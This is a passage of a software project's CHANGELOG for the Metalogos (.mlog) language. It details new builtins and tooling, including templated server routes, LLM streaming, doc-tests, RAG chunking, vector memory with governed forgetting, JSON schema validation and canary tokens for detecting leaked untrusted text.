- **all references updated** `AGENT.md` → `AGENTS.md` across the repository (10 files): `CHANGELOG.md`, `REFERENCE.md`, `.github/pull_request_template.md`, `.github/ISSUE_TEMPLATE/naryad_form.yml`, `docs/naryads-252-257-security-bugfix.md`, `docs/naryads-258-265-audit-tails.md`, `docs/research/naryad-271-sqlite-vec-spike.md`, `docs/research/naryad-275-streaming-spike.md`, `docs/research/naryad-282-smfs-spike.md`, `tests/reference_consistency.rs` (the "SSOT per AGENTS.md §5" comment). A historically accurate entry — only the file name; no new wording invented.
- **Block 2 — bridge files**: `CLAUDE.md`, `GEMINI.md` — **copies, not symbolic links** (a deliberate decision): on Windows, without `core.symlinks=true`/developer rights, a symlink turns into a plain text file with a path inside, not a working link — a silent breakage for some contributors. The copies are synchronized manually when `AGENTS.md` is edited (at the cost of a small desync, but without the risk of a silent failure on some platforms). At commit time — byte-identical (verified with `diff -q`).
- **Block 3 — README**: 3 lines added to the repository structure description (modeled on REFERENCE.md/CHANGELOG.md): `AGENTS.md` as the canonical file for agent tooling, `CLAUDE.md`/`GEMINI.md` as bridge copies.
- **zero diff** in `src/**` (no references there — verified). In `tests/**` — only the comment in `tests/reference_consistency.rs` (line 4), not functional code.
- **ADR**: not required (`ADR-0110` §1: an established pattern, not new semantics).
- **contract fulfilled**: `grep -rln 'AGENT\.md' . --include='*.md' --include='*.yml' --include='*.rs' | grep -v 'node_modules\|target\|/.git/'` is empty (after the edit).

### Added — tooling: the tree-sitter-mlog grammar for .mlog (Naryad #289, P2/tooling)

- **artifact**: `tree-sitter-mlog/` — a parallel artifact inside the repo (not a separate package — publishing as a separate package is a separate naryad when real demand appears). `grammar.js` (the tree-sitter DSL), `package.json` (the tree-sitter-cli dependency), `README.md` (coverage + correctness contract + divergences from grammar.pest + known limitations).
- **coverage** (Block 1): all major top-level declarations — entity (three forms), pattern, learnable pattern (with the ADR-0117 distill fields in any order), flow (with checkpoint + branch_def), rule, reflex/reflex_seq/reflex_gen, vision, type alias, llm config, mlogserver + route, template, db/schema/skill_index/memory/conversation/context_budget, import/hook/sandbox/mutate/eval/fluid/adapt, memorize/relate/forget, tool, test. All statements — let/let mut/assign, if (block + then), each, while, match (4 arm types + else), break/continue/return. All expressions — layered precedence (or/and/compare/add/mul/unary/access/primary), try, if-then-else, qualified call, struct/list literals, paren expr, all literals.
- **correctness contract** (Block 2): a `tree-sitter parse` run over 23 representative files from `examples/` (covering all pillars). Result: **12 PASS (no ERROR nodes), 11 PARTIAL (the parser recovered, ERROR nodes in deep constructs), 0 FAIL (no crashes)**. All 23 files parse structurally — not one crashes. Improving PARTIAL → PASS is a separate follow-up naryad when real demand appears.
- **publication** (Block 3): the grammar lives in the Metalogos repository itself (the naryad spec explicitly said — do not publish as a separate package in this naryad). Usage: `cd tree-sitter-mlog && npm install && ./node_modules/.bin/tree-sitter parse <file.mlog>`.
- **divergences from grammar.pest recorded explicitly** (not silently resolved one way): pest ordered choice ↔ tree-sitter GLR + conflicts; pest `_{ ... }` silent rules ↔ tree-sitter `inline`; pest keyword-via-ordered-choice ↔ tree-sitter `word` declaration (not set in v1 — a known limitation); pest allows empty-matching rules ↔ tree-sitter forbids them (the `*_body` rules were inlined into parents with `repeat1`); the initial entity record decl shape bug (params in parens vs `: Type = {...}`) fixed to mirror pest exactly.
- **known limitations**: 11/23 PARTIAL examples (GLR conflicts in deep constructs), `word: $.ident` not set, `block_if_else_expr` self-conflict, simplified multiline-string regex.
- **zero diff** in `src/**`, `tests/**`, `src/grammar.pest` — a parallel artifact, not part of .mlog compilation (the naryad contract).
- **docs**: `tree-sitter-mlog/README.md` (the full report: coverage, contract, divergences, known limitations, usage); CHANGELOG (this block).

### Added — adr: the ADR-0140 addendum to ADR-0131 — the no-reuse rule + SSOT-registry discipline for diagnostic codes (Naryad #288, P2/adr)

- **ADR-only, no code**: `docs/adr/0140-diag-codes-adr-addendum.md` — an addendum to ADR-0131 (Accepted 2026-09-10, naryad #255). ADR-0131 already answered questions 1-3 of the spec (format = `UPPER_SNAKE_CASE`; a single convention for `audit.rs` + `semantic.rs`; the JSON output `{code, message, span, severity}`). These questions are NOT reopened.
- **D1. The no-reuse rule (codes are reserved forever)**: a code once assigned to a diagnostic is never reused for a different meaning — even after the error is removed. A removal is accompanied by `removed_in: <version>` + `replaced_by: Option<code>` + a CHANGELOG entry. Precedent: Rust `rustc_error_codes`.
- **D2. SSOT-registry discipline**: the `DIAG_CODES: &[DiagCodeSpec]` registry — a separate module `src/diag_codes.rs` (new, not part of `audit.rs`). The `DiagCodeSpec { code, message_template, severity, category, removed_in, replaced_by }` structure. Append-only (the `BUILTIN_REGISTRY` template, naryad #170). Cross-source consistency — every `check_id` in source must have a matching entry in the registry; a collision is caught on CI (an implementation naryad, not this ADR).
- **D3. Categories inside the single registry**: a `category` field (`"security" | "semantic" | "vm" | "reflex" | "vision" | "voice" | ...`) for machine-readable category distinction within the single registry, rather than via separate registries. Resolves the spec's original rationale ("semantically different categories") through subcategorization, not separation.
- **D4. A snapshot of the known-code registry**: 17 unique `check_id`s in `audit.rs` at main `d3a1de5` (the naryad #283 merge) — all Category A/B security. The registry automatically includes these 17 as its base at creation; new `semantic.rs` codes are added append-only.
- **Implementation** (applying the codes to all `semantic.rs` errors + creating `src/diag_codes.rs` + `tests/diag_codes_registry_check.rs` + the `mlog check --json` flag) — a separate, follow-up naryad after this ADR is accepted. The ADR fixes the convention, not the implementation.
- **ADR-0131 remains in force** — the addendum adds two operational rules (no-reuse, SSOT-registry discipline) and does not revise the format / single convention / JSON shape.
- **docs**: ADR-0140 (this document); the ADR-README index regenerated (131→132 entries); the README ADR count synced (131→132); CHANGELOG (this block).

### Added — language: `server_path_param` — mlogserver templated routes `{name}`/`{*path}` (Naryad #283, P2/feature)

- **language**: `server_path_param(name) -> String` — the path parameter from a templated route (parity with `query_param`). Returns an empty string when absent (no template / no server context). Category `web`, arity 1.
- **route templates**: axum 0.8.9 syntax — `{name}` (one segment) and `{*path}` (the path tail, one or more segments). The templated dispatcher is a FALLBACK after the exact (static) match: static routes take priority over templates (axum semantics). A template with no match → the existing 404 path.
- **TW/VM parity** (Naryad #40): a `server_path_params: Option<HashMap<String, String>>` field in the Interpreter (`src/interpreter/mod.rs`) + Vm (`src/vm.rs`); `set_server_path_params`/`get_server_path_param` in Interpreter + Vm; `clear_server_context` in Vm resets `server_path_params` (parity with `server_query_params`); the builtin intercept `if name == "server_path_param"` in `execution.rs` (the callable form + the FnCall pattern body form) and `vm.rs::call_builtin` — all three arms identical.
- **percent-decoding** (parity with `query_param`): path segments are percent-decoded through the existing `url_decode_fallback` (the Bug 2.1 fix). `/forge/a%20b` → `server_path_param("name") == "a b"`.
- **conflict policy**: `check_route_template_conflicts` in `build_state` — a loud error at server startup if two templates can match one path with one method (e.g. `/a/{x}` and `/a/{y}` for GET). Conservative: catches same-shape and prefix+wildcard overlaps; does not attempt full overlap detection (full overlap analysis is the user's responsibility). Run in `build_state`, not in `run_server` — tests see the same behavior as production.
- **template parser** (`parse_route_template`): validation — empty `{}`, empty `{*}`, a segment after a wildcard (forbidden), nested braces `{{name}}`, unbalanced braces inside a literal segment. All errors are loud.
- **routing internals**: `route_handler` in `src/server.rs` now: (1) exact static match (as before); (2) if not found — `match_templated_route` (fallback). Returns `(Option<&RouteDecl>, HashMap<String,String>)` — path_params is empty for static, filled for template. `execute_route_body` and `execute_route_body_vm` take `path_params: &HashMap<String,String>` — injected into `interp.set_server_path_params`/`vm.set_server_path_params` (parity with the query_params inject).
- **tests** (7, all green): `n283_templated_route_basic` (`/demo/{name}` → "test"), `n283_wildcard_captures_tail` (`/files/{*path}` → "a/b/c"), `n283_static_wins_over_template` (literal vs template), `n283_percent_decoding` (`/forge/a%20b` → "a b"), `n283_no_match_returns_404`, `n283_template_conflict_at_startup` (a loud error with `/a/{x}` + `/a/{y}`), `n283_parity_tw_vm_templated_route` (TW and VM return the same body).
- **test helpers**: `call_route_full` (a new helper — static + template fallback, parity with `route_handler` production behavior) and `call_route_vm_with_path_params` (a VM parity helper for path_params).
- **docs**: REFERENCE §6 regenerated (408→409 builtins, 100%, 0 TODO); README (408→409 builtins); CHANGELOG (this block). Registry 408→409 (append-only, indices stable).
- **Related**: Naryad #40 (VM routes — backend parity is mandatory), №262/№263 (the route middleware gates are untouched, but are tested through `call_route_full`), FOSVED FO-023 (FORGE-1 — the first consumer: `/forge/repo?name=` → `/forge/{name}`). An additive router-surface extension: security is not weakened (the route gates apply to the body as before), no ADR required — recorded in the naryad docs.

### Added — language: `llm_stream_open/next/close` — streaming LLM over SmartRouter (Naryad #275, P1/feature/llm)

- **language**: `llm_stream_open(prompt, input?) -> Struct { handle, model, provider }` (arity 1..2); `llm_stream_next(handle) -> String` (one delta / `""` for keep-alive / `"__end__"` for the end); `llm_stream_close(handle) -> Struct { tokens, latency_ms, status, provider, model, input_tokens, output_tokens, aggregated_text }` — iterator-style streaming of the LLM answer as SSE chunks arrive, in the single-core block-in-place style (ADR-0096).
- **Spike + ADR**: the №275 verdict gate (issue #311, SG-3) — the verdict is **Go** (the spike report `docs/research/naryad-275-streaming-spike.md`, ADR-0137). Deviation from the issue #311 wording (recorded loudly in ADR-0137 §D3): `reqwest::blocking::Response` has no `chunk()` method (that is the async-`Response` API); instead — `impl std::io::Read for Response` + a hand-written incremental SSE parser. Semantically equivalent to "incremental chunked SSE reading without rewriting the backends" and satisfies the spirit of the Go criterion.
- **Architecture** (ADR-0137): the stream is embedded ON TOP of SmartRouter (ADR-0048) — `SmartRouter::stream_open` reuses the same candidate-selection + circuit-breaker + resolved-model as `SmartRouter::call`, but sends the POST with `stream: true`. `SmartRouter::call` remains unchanged; the single-shot path (`call_llm`/learnables/`call_claude`/`call_llm_schema`) without regressions. Failover **at the open stage only** (switching mid-stream is impossible — the circuit breaker will mark the sick provider, and the next `open` will bypass it).
- **Opaque handle** (the ADR-0114 template): `Value::LlmStream(LlmStreamId)`, `LlmStreamId = u32` — an index into the process-global `LLM_STREAM_REGISTRY` (lives in `crate::llm`, like `GLOBAL_SMART_ROUTER`/`GLOBAL_LLM_USAGE`). `Display`/`Debug` follow the `Reflex`/`Vision` templates (provider + model, not payload). One body for both backends — TW/VM parity by construction (ADR-0137 §D9).
- **A bounded state map** (the №263 lesson): `LLM_STREAM_REGISTRY` is limited (default 64, the `METALOGOS_LLM_STREAM_MAX` env override). Exceeding it → a loud `STREAM_LIMIT_REACHED`. Mock / non-SSE backends → a loud `STREAM_UNSUPPORTED` (the issue contract: not a silent full answer).
- **Trace**: one JSONL line per completed stream (the ADR-0138 §D4 contract — "streams will emit one line per completed call, never per chunk"). Latency = open→close, usage = aggregated from the final SSE event (Anthropic `message_delta` / the OpenAI final chunk with `usage` / Ollama `eval_count` in the final `done: true` chunk). Per-chunk tracing is absent by contract.
- **SSE parser**: a `\n\n` or `\r\n\r\n` terminator format; `data: <json>` lines; the `[DONE]` marker (OpenAI), the `message_stop` type (Anthropic), `"done": true` (Ollama). Provider-specific delta-text extraction (`choices[0].delta.content` for OpenAI-compatible, `delta.text` for the Anthropic `content_block_delta`, `response` for Ollama) + usage extraction (`prompt_tokens`/`completion_tokens` for OpenAI, `input_tokens`/`output_tokens` for Anthropic, `prompt_eval_count`/`eval_count` for Ollama). An unterminated SSE event left in the buffer at EOF marks the stream ended instead of crashing (loud only on `next` after close on the same handle).
- **Resource closure**: `llm_stream_close` drops the `reqwest::blocking::Response` → closes the TCP connection — the provider sees a client-side close. A mid-stream close is legitimate (status "ok", with whatever was received). `next` after `close` — a loud unknown-handle error.
- **Tests**: `tests/naryad_275_stream.rs` (5) with the mock SSE server `tests/p275_stream_server.py` (template: `tests/p76_http_download_server.py`): open→next→…→close basic (the aggregated text == "Hello, world!"), STREAM_UNSUPPORTED without SmartRouter, STREAM_LIMIT_REACHED (METALOGOS_LLM_STREAM_MAX=2 + 3 opens), close-before-end (a mid-stream drop, a next-after-close error), end-marker-after-[DONE] (`next` on an ended stream returns `__end__` without the network).
- **Documentation**: REFERENCE §6 regenerated (405 → 408 builtins, 100% coverage, 0 TODO); CHANGELOG (this block); ADR-0137 + the spike report + the ADR-README index regenerated (131 entries). Registry 405→408 (append-only, indices stable).

### Added — testing/docs: `mlog test --docs` — the rustdoc doc-tests pattern (Naryad #287, P2/M3)

- CLI: `mlog test --docs [GLOB...] [--backend tw|vm]` (defaults: REFERENCE.md, README.md, docs/book/**/*.md — the living LANGUAGE documentation; docs/adr/** and docs/research/** are historical records, included only by an explicit glob — loud). `mlog test <file>` — backward compatible (file is now an Option).
- Block contract: no marker — must execute without error; `// expect: <value>` — the last output line == the expectation (flow blocks); `// expect-error: <code?>` — must fail (the code is a substring, fail-closed); `// no-run` — parsing only; `// doc-test: skip` — fully skipped (grammar cheat sheets/sketches, counted).
- Classification: a flow block → a full run; declarations-only → parse + registration; a fragment → wrapped in a pattern __DocTest + flow Main; the fragment's import lines are lifted to the top level (the doc pattern "an import in the middle of an example").
- Read-only profile: an ephemeral tempdir-cwd per block (file/db effects are isolated, "no side effects on the CI machine"); the network/exec builtins (http_*, smtp_*, imap_*, mcp_*, exec, exec_argv) are replaced with loud-refusal stubs [DOC_SANDBOX] — the substitution is LOCAL to the interpreter (Interpreter::override_builtin + Builtins::override_handler; the SSOT registry is untouched); call_llm — the mock backend; escapes outward are loud via the №131/№252 sandbox.
- Interpreter soft errors: `[ERROR: unknown function …]` in the output — a block failure (silent lying is not allowed); boundary: a fragment call to an unknown function is discarded by TW semantics (the wrapper returns "") — documented in docs/doc-tests.md.
- Report: `doc-tests: N files, N extracted, M executed, K no-run, E expect-error, S skipped, F failures`; every error carries a semantic anchor `file: section: block #k` (the mlog block number + the markdown heading — lines change, the anchor does not); exit 1 on F>0.
- CI: a blocking doc-tests job after build — `./target/debug/mlog test --docs` — a merge gate; the №270 SSOT pipeline is not broken (generated blocks pass the same checks).
- Documentation cleaned by the first run (doc rot caught and fixed): REFERENCE §3.2 mutation demos → expect-error; §3.4/§4.x fragments — declarations added; the §4.1 text_chunk example is self-sufficient; §5 Syntax Reference (grammar cheat sheets with placeholders) → doc-test: skip; the §5.15 sandbox example fixed to the current syntax (identifiers in allowed/forbidden; was: the `ttp_post` typo and a ragged list); docs/book: syntax.md — declarations split into 6 fragments + the while example fixed (a let-shadow = an infinite loop → a mut assignment); tutorial.md — entity fields comma-separated, the learnable Greet declared (it was a call to an undeclared one), sandbox forbidden — real keys; stdlib.md — import as the first statement + let instead of entity-with-call; README — the Cron/AI-utilities block is self-sufficient (declarations + working CRC32 hashline hashes). docs/doc-tests.md — the contract (SSOT).
- tests: tests/naryad_287_doc_tests.rs (10): a fixture of all marker kinds (green/expect/expect-error±code/no-run/skip), the exact anchor of the red block, an expect mismatch, a missing file, the VM backend (execution + skip on the ADR-0105 vm-compile), language filtering of fences, default resolution (ADR/research outside the default), **the repo's real docs are green** (143 blocks, 68 executed, 73 skipped).
- docs: docs/doc-tests.md (the contract); CHANGELOG (this block); the README builtin counter untouched (405 unchanged — doc-tests add no builtins; test files 149→150).

### Added — language: `text_chunk` — structure-aware chunking for RAG (Naryad #285, P2/feature/memory)

- language: `text_chunk(text, strategy, opts?) -> List<Struct{index, text, chars, tokens, header_path?}>` (arity 2..3, category `string`, NO feature gate — a pure string function) — the first stage of the RAG pipeline (№272 delivered embed/vec_store/vec_search): a chunk producer instead of naive `split()` cutters. The industrial text-splitters pattern (LangChain RecursiveCharacterTextSplitter + MarkdownHeaderTextSplitter, LlamaIndex token budgets) with no dependencies.
- strategies: `"markdown"` — h1–h3 → sections with `header_path` ("H1 > H2 > H3", a level stack with correct reset when ascending; the preamble before the first heading → `header_path: ""`) — ready-made metadata for `vec_store` (search over document sections with a path filter); long sections are cut by the cascade "paragraph → newline → space"; heading lines are NEVER split (a heading reserves room in the first chunk's budget of its section; a heading longer than the budget is a loud `[TEXT_CHUNK_HEADER_TOO_LONG]` error, fail-closed). `"paragraph"` — blocks by double newline, small blocks greedily merged within the budget, long ones cascaded further down. `"fixed"` — budget windows with overlap (character-wise, deterministic).
- opts: `max_chars` (default 1200), `overlap` (default 100; CHARACTERS, applied in hard windowing and as the carry tail of the previous chunk when merging atoms — the seam is space-aligned: whole words appear in both chunks), `max_tokens?` — when set, the budget is computed through the reused `token_count` (the `token_count_estimate` SSOT in memory.rs — the same calculation, not a new counter; overlap remains in characters). The budget invariant is stronger than the stitching: a carry that does not fit the budget is dropped (the boundary is documented).
- loud errors (fail-closed, the №280/№284 pattern): an unknown strategy; `overlap >= max_chars` (and `overlap >= max_tokens` in token mode); `max_tokens <= 0`; `max_chars <= 0` (a spec extension — documented); unknown opts fields; opts not a Struct; a budget smaller than one character (`[TEXT_CHUNK_BUDGET_TOO_SMALL]`). Empty/short text → 1 chunk, NOT an error. `execution.rs` untouched (named in the spec — not needed, loudly).
- tests: `tests/naryad_285_text_chunk.rs` (18): markdown sections + header_path (3 levels, reset, preamble), long sections → paragraphs with header_path inheritance, headings never split, the budget invariant on all strategies, the token budget = the token_count SSOT (byte parity), overlap stitching (fixed + paragraph, whole words), input coverage by windows, merge/no-merge of small blocks, loud errors (7 forms), empty/short text, an idempotent run, **TW/VM parity**, [feature vec] integration `text_chunk → embed → vec_store(id = header_path#index) → vec_search` — the closest section of a markdown document by query (top-1 = "Животные#0").
- docs: REFERENCE §4.1 — the text_chunk row + examples (markdown chunks, section-aware RAG via vec_store); §6 regenerated (405, 100%, 0 TODO); README counts synced (405 builtins, 38 modules, 149 test files). Registry 404→405 (append-only, indices not shifted); token_count extracted into the `token_count_estimate` SSOT function (diagnostics/behavior byte-identical, the №-legacy tests green).

### Added — language: `user_profile` + scope isolation + the vec_search hybrid contract (Naryad #281, P2/M2)

- language: `user_profile(db_path, container) -> Struct{container, count, static, dynamic, buckets}` (arity 2, category `memory`, NO feature gate — the kv contour is core) — a deterministic one-call distillation of "what we know about X" (the supermemory user-profiles pattern), WITHOUT an LLM call (LLM synthesis is optional and explicit, out of Tier-1 scope — loud). The record source is the KV contour (memorize/kv_set with `memory { persist: <db_path> }` on the same file) by the `container:<container>:<bucket>:<key>` convention: `static` = long-lived facts, `dynamic` = the current context, `buckets` = arbitrary topics (Struct{name: List[Struct{key,value}]}), sorted by key — determinism. A profile with no records is EMPTY, not an error (including a db without the kv_store table); a malformed record (no `<bucket>:<key>` after the prefix) is a loud data error. The cache is in-process (a perf optimization, semantics unchanged) with double invalidation: the KV record generation (a counter on kv_set/mem_set/kv_delete/mem_delete — a write into the container invalidates instantly) + the file mtime (external writes bypassing the builtins).
- container isolation (the supermemory containerTag analog): the `container:<name>:` prefix is a hard profile boundary (records of another container are physically invisible — tested); the scope parameter for the SHARED surface: `vec_store(db, table, id, emb, {scope})` binds the table to a namespace on the first record (rebinding is loud), `vec_search(db, table, q, k, {scope})` verifies the binding BEFORE reads — a cross-scope → a loud `[SCOPE_VIOLATION]`, an unbound table with an explicit scope → loud (fail-closed). A user_profile scope parameter was deliberately not introduced: the container is already the isolation boundary (loud in the PR).
- hybrid contract: the `vec_search` 5th argument is a Bool type discriminator (include_forgotten №280, back-compat) | Struct opts `{include_forgotten?, mode?, scope?, query_text?}`: mode `"semantic"` (the default, the former KNN) | `"fts"` (BM25 over the FTS5 shadow `{table}__fts`, texts stored via `vec_store(db, table, id, emb, "text")` — arity 4..5; text rewritten by id) | `"hybrid"` (an RRF merge with k=60 of both arms — the formula reused from memory_store ADR-0094/0075; ids hitting BOTH arms rank higher). The hit shape gains `score` ∈ [0,1] (semantic: 1−distance; fts: max-normalized bm25; hybrid: max-normalized RRF); distance = true cosine in semantic, 1−score in fts/hybrid (NOT a physical distance — honest). The forgotten post-filter (№280) works in all modes. Unknown opts fields / wrong types / fts-hybrid without query_text / an empty query_text / fts mode without a text index — loud.
- The "two stores" are documented in REFERENCE §4.5: documents/chunks (what is in the source, vec tables with texts) ≠ derived facts (what we know about an entity, the profile's container records) — different tables, different life cycles.
- tests: `tests/naryad_281_profile.rs` (23): an empty profile / no kv_store / static-dynamic-buckets grouping, cross-container isolation, a malformed record is loud, cache invalidation by a write through a live kv_set+persist, sandbox/arity, scope bind/ok/cross-loud/unbound-loud/rebind-loud/legacy-unaffected, fts mode (lexical hits, score normalization), fts without an index / without query_text / empty text — loud, unknown opts (search+store), the semantic mode unchanged (id+distance byte-for-byte), **hybrid ≥ max(arms) in recall on a fixed corpus** (semantic@2 loses the text-relevant d4, fts@2 loses the vector-relevant d1, hybrid@2 covers both — the table is in the PR), the forget filter in all modes + include_forgotten via opts, the vec_store payload shapes, TW/VM parity (kv_set → user_profile → vec_store with text → an fts search, the same "2:email:1" result).
- docs: REFERENCE §4.5 — the vec_store/vec_search rows updated (payload/scope/mode/score), a new user_profile row, the "two stores" block, a hybrid+profile example; §6 regenerated (404, 100%, 0 TODO); README counts synced (404 builtins, 38 modules, 148 test files, ~180 KB REFERENCE). Registry 403→404 (user_profile appended; the vec_store arity pin 4→4..5 in place — loud, indices not shifted).

### Added — language: `memory_forget` — governed forgetting with boundaries, a soft-delete ledger (Naryad #280, P2/M2)

- language: `memory_forget(db_path, table, query, threshold, max_forget[, dry_run[, ids]]) -> Struct{candidates, applied, batch_id}` (arity 5..7, category `memory`, the `vec` feature gate — Tier 1 on top of vec_search №272). Governed forgetting per the supermemory forget-matching discipline: a dry run → the candidate id list → apply strictly by ids → a forgetBatchId on every erased record. `dry_run=true` is the DEFAULT (arity 5, or an explicit `true`): returns only the candidates `List[Struct{id, score}]` — cosine similarity (the best per id; dedup by id; already-forgotten ids are not candidates), `applied: 0`, `batch_id: ""`, the state is NOT changed. Apply (`dry_run=false`) — STRICTLY by the explicit `ids` list from the preview, never by re-running the query: every id is checked pointwise against the preview's bounds (exists in the table + similarity ≥ threshold — the SAME computations as in the preview, not a re-run KNN); a non-existent id / an id out of bounds is a LOUD error BEFORE any writes (apply atomicity); the count ≤ `max_forget`.
- soft delete: NO physical deletion — erased ids go into the forget-ledger `{table}__forgotten` (id, batch_id, reason, forgotten_at) in the same SQLite db; the `batch_id` `MLOG-FORGET-<base32×26>` (128 bits, rand 0.10 — a format sibling of the №284 canary marker) is stamped on every record and returned; a repeated forget of the same id is a no-op (`applied: 0`, `batch_id: ""` — an empty apply leaves no trace in the journal). Physical vacuum is a separate owner operation, not a builtin.
- vec_search extended to arity 4..5: an optional fifth argument `include_forgotten` (Bool, default `false`) — a post-filter of forgotten ids from the ledger; `k` is the KNN sample size BEFORE the filter (after the filter the result may be smaller than `k` — honestly documented). For a db without forget the behavior is byte-for-byte the same; the №272 arity pin updated (an upward extension, the bytecode index not shifted, the registry append-only 402→403).
- loud errors: a threshold outside [0, 1]; a non-integer/out-of-[1, 10000] max_forget (the DoS boundary, same as k); `dry_run=false` without ids; `ids` together with `dry_run=true`; a `List` in the `dry_run` position (the programmer forgot dry_run); an empty ids list; a non-String ids element; a dim mismatch; a missing table; sandbox violations (the preview is ForRead — the file must exist, apply is ForWrite). The taint invariant: forgetting operates ONLY on the vec0 table and the ledger — canary detection (№284), taint labels and the LLM logs are untouched (forgetting does not "erase" a compromise from the logs); secrets never enter memory in the first place (№274 masking before memory) — forget is not obliged to "erase" them.
- out of scope (loud): auto-forgetting v2 (a TTL for episode records, updates displacing facts — synergy with the №273 LRU) — the separate issue #329 checkbox stays open; refill semantics for k after the filter; a memory JSONL trace (the ledger itself is the operation journal in the №276 spirit).
- tests: `tests/naryad_280_forget.rs` (28): a preview without mutation (rows alive, no ledger created), sorting by score desc, threshold/max_forget cutting (incl. on 100 records), id dedup with the best score, already-forgotten ids excluded from the preview, all loud errors of the apply contract, the full cycle dry_run → apply by ids → batch_id in the ledger (a direct sqlite read), the no-op of a repeated forget, batch_id uniqueness, the back-compat arity-4 vec_search, include_forgotten=true, the arity/type pins, the canary taint invariant, TW/VM parity (embed → vec_store → preview → apply → vec_search, the same result on both backends).
- docs: REFERENCE §4.5 — the `memory_forget` row + the updated `vec_search` row + a "preview → apply by the preview's ids" example + the sandbox paragraph; §6 regenerated (403, 100%, 0 TODO); README counts synced (403 builtins, 38 modules, 147 test files, ~174 KB REFERENCE).

### Added — language: `json_validate` — the ADR-0133 validator as a standalone builtin, "shape-before-use" (Naryad #286, P2/M1)

- language: `json_validate(schema_json, value_json) -> Struct{valid, errors}` (arity 2..3, category `llm`) — checking a JSON string against the ADR-0133 subset WITHOUT an LLM call: `valid` is a Bool, `errors` is a List<String> with violation paths (`value.age: expected type integer, got string "33"`); an empty `errors` ⟺ `valid`. The third argument `strict` (default `true`): `true` = the ADR-0133 D2 strict-by-default — fields outside `properties` are violations (as in `call_llm_schema`); `false` — undeclared fields are allowed (the №286 opt-in), the other rules (type/required/items/enum, the subset, the root-object contract) NOT changed.
- THE MAIN POINT: one validator for both paths — extracted from the LLM path (№269, `call_llm_schema`) into the shared module `src/schema/validate.rs` (`check_schema_subset` + `validate_json`), `call_llm_schema` calls it through compat shims with byte-identical diagnostics (the №269 tests unchanged). The "not a single new rule" differential contract is pinned by a test: a shared corpus of schemas/values yields identical verdicts in `call_llm_schema` (provider-injected, no network) and `json_validate`, and the violation texts match word for word (the only intended difference — the root label `answer`/`value`).
- loud: an invalid `schema_json` / a keyword outside the subset / a non-object root — `[LLM_SCHEMA_UNSUPPORTED_FEATURE]`, the SAME code as `call_llm_schema` (the same `check_schema_subset`); an invalid `value_json` — a loud parse error (`json_validate() error: value_json is not valid JSON: …`), NOT `valid=false` — the validator judges structure, the parser judges bytes; a non-Bool `strict` — a loud type error.
- a robustness fix during the extraction (verdicts unchanged): `short_repr` in violation reports could PANIC on the `&s[..60]` slice with a multibyte value (e.g. long Cyrillic in a type/enum violation) — truncation is now on a char boundary; the format for ASCII is unchanged.
- not feature-gated: the builtin is available in the minimal build too (without `llm`) — it validates data NOT from an LLM (MCP tool outputs №268/#304, HTTP responses, `request_body`); reusing the taint semantics is NOT part of the naryad: `json_validate` neither removes nor sets taint labels (`redact` №274 masks the content, `json_validate` №286 checks the shape — different axes).
- tests: `tests/naryad_286_json_validate.rs` (13): exact violation paths/texts (dot-path, indexed path, missing required, strict-by-default), enum priority, loud schema/value/strict errors, strict=false (allows only undeclared fields; types/required/enum/nested unchanged), a DIFFERENTIAL CORPUS (11 cases × both paths: verdicts + texts) + the schema-side differential (4 bad schemas × both paths, the same code), the TW+VM language contract (an MCP-style payload: ok/bad), strict as an explicit argument TW+VM, the arity/type/parsing pins. Registry 401→402; the REFERENCE §4.5 row + a "MCP tool output → json_validate → use" example + the regenerated §6; README counts synced (402 builtins, 38 modules, 146 test files).

### Added — language: `canary_insert` / `canary_check` — canary tokens for untrusted text, the "compromised channel" detector (Naryad #284, P1/M1)

- language: `canary_insert(text, opts?) -> Struct{marked_text, canary_id}` (arity 1..2, category `security`) embeds a random canary marker — `MLOG-CANARY-` + 26 base32 chars (128-bit entropy, RFC 4648 alphabet, rand 0.10 as for crypto nonces) — into untrusted text BEFORE it goes into an LLM prompt; opts: `count` (1..=4, default 1, same id inserted count times) and `position` (`"random"|"head"|"tail"`, default `"random"`). `canary_check(text, canary_id, opts?) -> Struct{leaked, id, position}` (arity 2..3) detects the marker in the response: exact occurrence plus resistance to trivial distortions (case, splitting by whitespace/punctuation) via alnum-normalization with a char-index back-map; `position` is the CHAR index of the first hit in the original text (-1.0 when clean); opts `mode="zwsp"` additionally ignores zero-width chars (U+200B/200C/200D/2060/FEFF) inside the marker — in the default `"exact"` they deliberately BREAK the match (honest boundary: suspect zero-width evasion → check in `"zwsp"`).
- detector, NOT a gate — both halves wired into the language's taint model (not a standalone utility): RUNTIME — a confirmed leak prints the loud `[CANARY_LEAK]` warning to stderr and increments the new `llm_usage().canary_leaks` counter (global atomic, the №273 `cache_hits_semantic` template); STATIC — in the then-branch of `if (r.leaked)` (both `let r = canary_check(resp, id)` and the recorded binding) the checked response is labeled `TaintKind::CanaryLeak` ("compromised channel", path-sensitive fork of the audit tracker), and a CanaryLeak-labeled value reaching a sink (`respond`, `http_post`, `call_llm`, `call_claude`, `reflex_generate`, `mcp_call`) produces the advisory audit-warning `CANARY_LEAK` in `audit_program` only — deliberately NOT in `audit_category_a`, where Warnings are promoted to compile errors (that would contradict "the decision to stop the pipeline belongs to the author"). `render`/`escape_html` clear the label (Sanitized semantics); `redact` does NOT (masking ≠ channel sanitization, the ADR-0136 D2 template).
- redact interlock (№274 invariant — "a canary is not a secret, a secret is not a canary"): `redact_string` now carves out `MLOG-CANARY-<id>` spans before masking (segment-scoped redaction) — the 26-char base32 id otherwise trips the base64 entropy net and would be destroyed before reaching the LLM; secrets NEXT TO a marker are still masked. canary_id is strictly format-validated (prefix + 26 × A-Z2-7) — a secret-shaped string is a loud `unknown canary_id` error.
- loud errors: empty text (both builtins), double-marking (text already contains `MLOG-CANARY-*`), zero-width chars in text BEFORE insertion (matching hygiene), count outside 1..=4, unknown position/mode/opts field (fail-closed), non-String text/id, non-Struct opts, malformed canary_id.
- tests: `tests/naryad_284_canary.rs` (28): marker format + 128-bit entropy (no collisions), head/tail/random shapes, count 1..=4, all loud errors, exact/case/space/punct/newline distortions, zero-width exact-miss vs zwsp-detect, char-index position (incl. Cyrillic), zero false positives on a clean corpus, redact×canary interlock both directions, the full leak scenario green in TW and VM (`canary_insert` → mock `call_llm` echo → `canary_check` → leaked) with the counter observable from the language (`llm_usage().canary_leaks`) and from Rust, static then-branch warnings for respond/http_post/call_llm/call_claude, else-branch/no-check negatives, render-washes/redact-does-not, and the not-promoted-to-compile-error guarantee. Registry 399→401, categories 37→38 (new `security`), REFERENCE §4.1 rows + generated §6 `security` section, threat-model Category B row with honest limits.

### Added — language: `redact(text, mode)` — PII/secrets as a taint-sanitizer (Naryad #274, ADR-0136)

